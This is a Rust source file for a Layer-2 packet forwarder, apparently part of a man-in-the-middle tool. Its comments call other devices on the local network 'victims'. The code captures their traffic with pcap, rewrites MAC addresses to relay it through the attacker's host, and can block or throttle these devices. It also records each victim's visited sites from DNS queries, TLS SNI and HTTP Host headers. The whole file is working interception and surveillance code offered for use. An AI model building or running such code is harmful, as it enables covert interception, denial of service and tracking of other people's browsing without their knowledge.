//! l2_forwarder.rs
//! ================
//! Strict Layer-2 packet forwarder. Captures every IPv4 packet on the wire,
//! rewrites MAC addresses according to the forwarding rules below, and
//! reinjects modified packets via pcap.
//!
//! Blueprint 3.B - Outbound (Victim -> Internet):
//!   if Ether.src is a monitored victim MAC:
//!       Ether.dst = gateway_mac
//!       Ether.src = local_mac
//!       reinject
//!
//! Blueprint 3.C - Inbound (Internet -> Victim):
//!   if Ether.src == gateway_mac:
//!       parse IPv4.dst, look up in registry
//!       if monitored:
//!           Ether.dst = victim_mac
//!           Ether.src = local_mac
//!           reinject
//!
//! Anti-loop BPF filter (Blueprint 3.A):
//!   ip and not host <local_ip> and not ether src <local_mac>
//! This prevents the host from sniffing its own injected packets.
//!
//! FIX #2: Bytes are now counted ONLY after a successful pcap send.
//! If sendpacket fails, tokens are refunded to the token bucket so
//! throttled devices don't permanently lose bandwidth.

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Mutex;

use pcap::Capture;
use pcap::Device as PcapDevice;
use pnet_packet::ipv4::Ipv4Packet;
use pnet_packet::tcp::TcpPacket;
use pnet_packet::udp::UdpPacket;
use pnet_packet::Packet;
use pnet::util::MacAddr;

use crate::device_registry::REGISTRY;

/// Parse a MAC address string like "aa:bb:cc:dd:ee:ff" into [u8; 6].
pub fn parse_mac_to_bytes(mac: &str) -> Result<[u8; 6], String> {
    let parts: Vec<u8> = mac
        .split(':')
        .map(|h| u8::from_str_radix(h, 16).map_err(|e| format!("hex parse '{}' : {}", h, e)))
        .collect::<Result<Vec<u8>, _>>()?;
    if parts.len() != 6 {
        return Err(format!("expected 6 octets, got {}", parts.len()));
    }
    let mut out = [0u8; 6];
    out.copy_from_slice(&parts);
    Ok(out)
}

pub struct L2Forwarder {
    iface: String,
    local_ip: String,
    local_mac: String,
    gateway_mac: String,
    local_mac_bytes: [u8; 6],
    gateway_mac_bytes: [u8; 6],
    capture_handle: Mutex<Option<Capture<pcap::Active>>>,
    send_handle: Mutex<Option<Capture<pcap::Active>>>,
    /// Cumulative count of packets forwarded (rewritten and reinjected).
    pub packets_forwarded: AtomicU64,
    /// DEBUG: total packets captured (for diagnostics).
    pub packets_seen: AtomicU64,
    /// Signal the forwarding loop to exit (set by close_capture on shutdown).
    stop_flag: AtomicBool,
}

impl L2Forwarder {
    pub fn new(iface: &str, local_ip: &str, local_mac: &str, gateway_mac: &str) -> Self {
        println!(
            "[L2FORWARD] Created forwarder: iface={} local_ip={} local_mac={} gateway_mac={}",
            iface, local_ip, local_mac, gateway_mac
        );
        let local_mac_bytes = parse_mac_to_bytes(local_mac).unwrap_or([0u8; 6]);
        let gateway_mac_bytes = parse_mac_to_bytes(gateway_mac).unwrap_or([0u8; 6]);
        Self {
            iface: iface.to_string(),
            local_ip: local_ip.to_string(),
            local_mac: local_mac.to_lowercase(),
            gateway_mac: gateway_mac.to_lowercase(),
            local_mac_bytes,
            gateway_mac_bytes,
            capture_handle: Mutex::new(None),
            send_handle: Mutex::new(None),
            packets_forwarded: AtomicU64::new(0),
            packets_seen: AtomicU64::new(0),
            stop_flag: AtomicBool::new(false),
        }
    }

    /// Helper to create and configure a capture handle.
    fn create_capture(&self) -> Result<Capture<pcap::Active>, String> {
        let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
        let dev = devices
            .into_iter()
            .find(|d| d.name == self.iface)
            .ok_or_else(|| format!("interface '{}' not found", self.iface))?;

        let mut cap = Capture::from_device(dev)
            .map_err(|e| format!("pcap open device: {}", e))?
            .promisc(false)
            .snaplen(2048)
            .buffer_size(16 * 1024 * 1024)
            .timeout(1)
            .immediate_mode(true)
            .open()
            .map_err(|e| format!("pcap open capture: {}", e))?;

        // Anti-loop BPF filter (Blueprint 3.A) - handles both untagged and 802.1Q tagged frames
        let filter = format!(
            "(ip or (vlan and ip)) and not host {} and not ether src {}",
            self.local_ip, self.local_mac
        );
        cap.filter(&filter, true)
            .map_err(|e| format!("pcap filter '{}' : {}", filter, e))?;
        Ok(cap)
    }

    /// Open the read/capture handle with the anti-loop BPF filter.
    pub fn open_capture(&self) -> Result<(), String> {
        let cap = self.create_capture()?;
        println!("[L2FORWARD] Capture opened with BPF (promisc=false, immediate=true)");
        let mut guard = self.capture_handle.lock().unwrap();
        *guard = Some(cap);
        Ok(())
    }

    /// Open the injection/send handle with minimal buffering and drop filter.
    pub fn open_send(&self) -> Result<(), String> {
        let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
        let dev = devices
            .into_iter()
            .find(|d| d.name == self.iface)
            .ok_or_else(|| format!("interface '{}' not found for send", self.iface))?;

        let mut cap = Capture::from_device(dev)
            .map_err(|e| format!("pcap open device send: {}", e))?
            .promisc(false)
            .snaplen(64)
            .buffer_size(64 * 1024)
            .immediate_mode(false)
            .timeout(1000)
            .open()
            .map_err(|e| format!("pcap open capture send: {}", e))?;

        // Drop incoming packets on send handle so Npcap kernel driver does zero packet buffering/copying
        let _ = cap.filter("ether proto 0xffff", true);

        let mut guard = self.send_handle.lock().unwrap();
        *guard = Some(cap);
        println!("[L2FORWARD] Send handle opened with kernel drop filter.");
        Ok(())
    }

    /// Return the number of packets forwarded since startup.
    pub fn stats_pkts(&self) -> u64 {
        self.packets_forwarded.load(Ordering::Relaxed)
    }

    /// Blocking forwarding loop. Call from `spawn_blocking`.
    pub fn run_forwarding_loop(&self) -> Result<(), String> {
        println!("[L2FORWARD] Starting lock-free forwarding loop...");

        let mut cap = match self.capture_handle.lock().unwrap().take() {
            Some(c) => c,
            None => return Err("capture handle not initialized".to_string()),
        };

        let mut send_cap = match self.send_handle.lock().unwrap().take() {
            Some(c) => c,
            None => return Err("send handle not initialized".to_string()),
        };

        let mut consecutive_errors: u32 = 0;
        let mut last_debug_print = std::time::Instant::now();
        let mut stack_buf = [0u8; 2048];

        loop {
            // Check shutdown flag before each iteration
            if self.stop_flag.load(Ordering::Relaxed) {
                println!("[L2FORWARD] Stop flag set, exiting loop.");
                return Ok(());
            }

            match cap.next_packet() {
                Ok(pkt) => {
                    let pkt_len = pkt.data.len();
                    consecutive_errors = 0;
                    let seen = self.packets_seen.fetch_add(1, Ordering::Relaxed);
                    // DEBUG: print packet count every 5 seconds
                    if last_debug_print.elapsed().as_secs() >= 5 {
                        let fwd = self.packets_forwarded.load(Ordering::Relaxed);
                        println!(
                            "[L2FORWARD] packets_seen={} packets_forwarded={}",
                            seen + 1,
                            fwd
                        );
                        last_debug_print = std::time::Instant::now();
                    }

                    if pkt_len <= stack_buf.len() {
                        stack_buf[..pkt_len].copy_from_slice(pkt.data);
                        self.process_packet(&stack_buf[..pkt_len], &mut send_cap);
                    } else {
                        let heap_buf = pkt.data.to_vec();
                        self.process_packet(&heap_buf, &mut send_cap);
                    }
                }
                Err(pcap::Error::TimeoutExpired) => {
                    consecutive_errors = 0;
                }
                Err(pcap::Error::NoMorePackets) => return Ok(()),
                Err(e) => {
                    eprintln!("[L2FORWARD] capture error: {}", e);
                    consecutive_errors += 1;
                }
            }

            // ---- pcap auto-recovery ----
            if consecutive_errors >= 50 {
                eprintln!(
                    "[L2FORWARD] {} consecutive pcap errors — attempting recovery...",
                    consecutive_errors
                );
                let mut recovered = false;
                for attempt in 1..=5 {
                    match self.create_capture() {
                        Ok(new_cap) => {
                            println!("[L2FORWARD] pcap recovered (attempt {})", attempt);
                            cap = new_cap;
                            consecutive_errors = 0;
                            recovered = true;
                            break;
                        }
                        Err(e) => {
                            eprintln!(
                                "[L2FORWARD] recovery attempt {}/5 failed: {}",
                                attempt, e
                            );
                            if attempt < 5 {
                                std::thread::sleep(std::time::Duration::from_secs(2));
                            }
                        }
                    }
                }

                if !recovered {
                    eprintln!("[L2FORWARD] All 5 recovery attempts failed. Exiting.");
                    self.stop_flag.store(true, Ordering::Relaxed);
                    return Err("pcap recovery exhausted after 5 attempts".to_string());
                }
            }
        }
    }

    /// Process a single captured packet with lock-free reinjection.
    fn process_packet(&self, data: &[u8], send_cap: &mut Capture<pcap::Active>) {
        if data.len() < 14 {
            return;
        }

        let source_mac = MacAddr(data[6], data[7], data[8], data[9], data[10], data[11]);
        let source_str = mac_addr_to_str(&source_mac);

        let raw_ethertype = u16::from_be_bytes([data[12], data[13]]);

        // Support both standard Ethernet (0x0800) and 802.1Q VLAN tagged frames (0x8100) from routers
        let (ip_offset, is_ipv4) = if raw_ethertype == 0x0800 {
            (14, true)
        } else if raw_ethertype == 0x8100 {
            if data.len() >= 18 {
                let inner = u16::from_be_bytes([data[16], data[17]]);
                (18, inner == 0x0800)
            } else {
                (14, false)
            }
        } else {
            (14, false)
        };

        if !is_ipv4 || data.len() < ip_offset + 20 {
            return;
        }

        let ipv4_slice = &data[ip_offset..];
        let ipv4 = match Ipv4Packet::new(ipv4_slice) {
            Some(ip) => ip,
            None => return,
        };

        let ip_total_len = ipv4.get_total_length() as usize;
        if ipv4_slice.len() < ip_total_len || ip_total_len < 20 {
            return;
        }

        // Exact clean IPv4 packet (stripping any 802.11 FCS trailing bytes or driver padding)
        let clean_ipv4 = &ipv4_slice[..ip_total_len];

        let ip_src = format!("{}", ipv4.get_source());
        let ip_dst = format!("{}", ipv4.get_destination());

        // Dynamic IP update: if a client renewed DHCP or changed IP, update registry immediately
        if source_str != self.local_mac && source_str != self.gateway_mac {
            REGISTRY.update_ip_if_changed(&source_str, &ip_src);
        }

        // Frame wire length for accounting (standard 14-byte Ethernet header + IPv4 total length)
        let wire_len = (14 + ip_total_len) as u64;

        // ---- Outbound (Victim -> Internet) ----
        if source_str != self.gateway_mac && source_str != self.local_mac {
            if let Some((victim_mac, is_blocked)) = REGISTRY.check_forward_outbound(&source_str, &ip_src) {
                if is_blocked {
                    return;
                }

                if !REGISTRY.allow_packet(&victim_mac, wire_len) {
                    return;
                }

                // === SITES VISITED INSPECTION ===
                let ip_payload = ipv4.payload();
                if let Some(udp) = UdpPacket::new(ip_payload) {
                    if udp.get_destination() == 53 {
                        if let Some(domain) = extract_dns_query(udp.payload()) {
                            REGISTRY.record_visit(&victim_mac, domain);
                        }
                    }
                } else if let Some(tcp) = TcpPacket::new(ip_payload) {
                    let dst_port = tcp.get_destination();
                    if dst_port == 443 {
                        if let Some(sni) = extract_tls_sni(tcp.payload()) {
                            REGISTRY.record_visit(&victim_mac, sni);
                        }
                    } else if dst_port == 80 {
                        if let Some(host) = extract_http_host(tcp.payload()) {
                            REGISTRY.record_visit(&victim_mac, host);
                        }
                    }
                }

                if self.rewrite_and_send(
                    send_cap,
                    clean_ipv4,
                    &self.gateway_mac_bytes, // new Ether.dst = gateway MAC
                    &self.local_mac_bytes,   // new Ether.src = local MAC
                ) {
                    REGISTRY.add_ul(&victim_mac, wire_len);
                    self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
                } else {
                    REGISTRY.refund_tokens(&victim_mac, wire_len);
                }
                return;
            }
        }

        // ---- Inbound (Internet / Gateway -> Victim) ----
        if let Some((victim_mac, victim_mac_bytes, is_blocked)) = REGISTRY.check_forward_inbound(&ip_dst) {
            if source_str != victim_mac && source_str != self.local_mac {
                if is_blocked {
                    return;
                }

                if !REGISTRY.allow_packet(&victim_mac, wire_len) {
                    return;
                }

                if self.rewrite_and_send(
                    send_cap,
                    clean_ipv4,
                    &victim_mac_bytes,     // new Ether.dst = victim MAC
                    &self.local_mac_bytes, // new Ether.src = local MAC
                ) {
                    REGISTRY.add_dl(&victim_mac, wire_len);
                    self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
                } else {
                    REGISTRY.refund_tokens(&victim_mac, wire_len);
                }
            }
        }
    }

    /// Rewrite MAC addresses and reinject clean untagged Ethernet frame with zero heap allocations and zero locks.
    /// Strips any 802.1Q tags from router so victim mobile devices (Android/iOS) cleanly accept frames.
    /// Returns true on successful send, false on failure.
    fn rewrite_and_send(
        &self,
        send_cap: &mut Capture<pcap::Active>,
        clean_ipv4: &[u8],
        new_dst: &[u8; 6],
        new_src: &[u8; 6],
    ) -> bool {
        let ip_len = clean_ipv4.len();
        let frame_len = 14 + ip_len;
        const MIN_ETH_FRAME: usize = 60;
        let target_len = if frame_len < MIN_ETH_FRAME { MIN_ETH_FRAME } else { frame_len };

        let mut buf = [0u8; 2048];
        if target_len > buf.len() {
            let mut heap_buf = vec![0u8; target_len];
            heap_buf[0..6].copy_from_slice(new_dst);
            heap_buf[6..12].copy_from_slice(new_src);
            heap_buf[12..14].copy_from_slice(&[0x08, 0x00]); // Pure untagged EtherTypes::Ipv4
            heap_buf[14..14 + ip_len].copy_from_slice(clean_ipv4);
            match send_cap.sendpacket(heap_buf.as_slice()) {
                Ok(()) => true,
                Err(e) => {
                    eprintln!("[L2FORWARD] !! sendpacket error: {}", e);
                    false
                }
            }
        } else {
            buf[0..6].copy_from_slice(new_dst);
            buf[6..12].copy_from_slice(new_src);
            buf[12..14].copy_from_slice(&[0x08, 0x00]); // Pure untagged EtherTypes::Ipv4
            buf[14..14 + ip_len].copy_from_slice(clean_ipv4);
            if frame_len < MIN_ETH_FRAME {
                buf[frame_len..MIN_ETH_FRAME].fill(0);
            }
            match send_cap.sendpacket(&buf[..target_len]) {
                Ok(()) => true,
                Err(e) => {
                    eprintln!("[L2FORWARD] !! sendpacket error: {}", e);
                    false
                }
            }
        }
    }

    /// Close the capture handle and signal the forwarding loop to exit.
    pub fn close_capture(&self) {
        self.stop_flag.store(true, Ordering::Relaxed);
        println!("[L2FORWARD] Capture stop flag set.");
    }
}

fn mac_addr_to_str(mac: &MacAddr) -> String {
    // pnet_macros::MacAddr has fields .0 through .5
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        mac.0, mac.1, mac.2, mac.3, mac.4, mac.5
    )
}

fn extract_dns_query(payload: &[u8]) -> Option<String> {
    if payload.len() < 12 { return None; }
    let qdcount = u16::from_be_bytes([payload[4], payload[5]]);
    if qdcount == 0 { return None; }
    decode_dns_name(payload, 12)
}

fn decode_dns_name(data: &[u8], mut offset: usize) -> Option<String> {
    let mut labels = Vec::new();
    let mut iterations = 0;
    loop {
        if iterations > 20 || offset >= data.len() { break; }
        iterations += 1;
        let len = data[offset] as usize;
        if len == 0 { break; }
        if (data[offset] & 0xC0) == 0xC0 {
            if offset + 1 >= data.len() { break; }
            let ptr = (((data[offset] & 0x3F) as usize) << 8) | data[offset + 1] as usize;
            offset = ptr;
            continue;
        }
        offset += 1;
        if offset + len > data.len() { break; }
        if let Ok(label) = std::str::from_utf8(&data[offset..offset + len]) {
            labels.push(label.to_string());
        }
        offset += len;
    }
    if labels.is_empty() { None } else { Some(labels.join(".")) }
}

fn extract_tls_sni(payload: &[u8]) -> Option<String> {
    if payload.len() < 5 || payload[0] != 0x16 { return None; }
    let record_len = u16::from_be_bytes([payload[3], payload[4]]) as usize;
    if payload.len() < 5 + record_len { return None; }
    let hs = &payload[5..5 + record_len];
    if hs.len() < 4 || hs[0] != 0x01 { return None; }
    let ch = &hs[4..];
    if ch.len() < 38 { return None; }
    let mut off = 2 + 32;
    if off >= ch.len() { return None; }
    let sid_len = ch[off] as usize; off += 1 + sid_len;
    if off + 2 > ch.len() { return None; }
    let cs_len = u16::from_be_bytes([ch[off], ch[off+1]]) as usize; off += 2 + cs_len;
    if off >= ch.len() { return None; }
    let comp_len = ch[off] as usize; off += 1 + comp_len;
    if off + 2 > ch.len() { return None; }
    let ext_len = u16::from_be_bytes([ch[off], ch[off+1]]) as usize; off += 2;
    let end = off + ext_len;
    while off + 4 <= end && off + 4 <= ch.len() {
        let ext_type = u16::from_be_bytes([ch[off], ch[off+1]]);
        let elen = u16::from_be_bytes([ch[off+2], ch[off+3]]) as usize;
        off += 4;
        if ext_type == 0x0000 {
            if off + 5 > ch.len() { break; }
            let sni_off = off + 2;
            let name_type = ch[sni_off];
            let name_len = u16::from_be_bytes([ch[sni_off+1], ch[sni_off+2]]) as usize;
            let name_start = sni_off + 3;
            if name_type == 0 && name_start + name_len <= ch.len() {
                return std::str::from_utf8(&ch[name_start..name_start+name_len]).ok().map(|s| s.to_string());
            }
            break;
        }
        off += elen;
    }
    None
}

fn extract_http_host(payload: &[u8]) -> Option<String> {
    let text = std::str::from_utf8(payload).ok()?;
    for line in text.split("\r\n") {
        let lower = line.to_lowercase();
        if lower.starts_with("host:") {
            let host = line[5..].trim();
            let host = host.split(':').next().unwrap_or(host);
            if !host.is_empty() { return Some(host.to_string()); }
        }
    }
    None
}
